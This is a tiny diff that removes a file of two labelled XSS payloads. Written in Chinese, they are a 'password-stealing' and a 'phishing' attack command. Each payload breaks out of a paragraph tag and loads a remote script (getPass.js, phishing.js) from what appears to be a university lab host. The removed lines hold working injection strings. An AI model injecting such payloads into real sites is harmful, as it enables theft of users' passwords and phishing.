@@ -1,4 +1,0 @@
-XSS取得密碼攻擊指令
-</p><script src="http://cs052.csie.ncyu.edu.tw/getPass.js" type="text/javascript"></script><p>
-XSS釣魚攻擊指令
-</p><script src="http://cs052.csie.ncyu.edu.tw/phishing.js" type="text/javascript"></script><p>
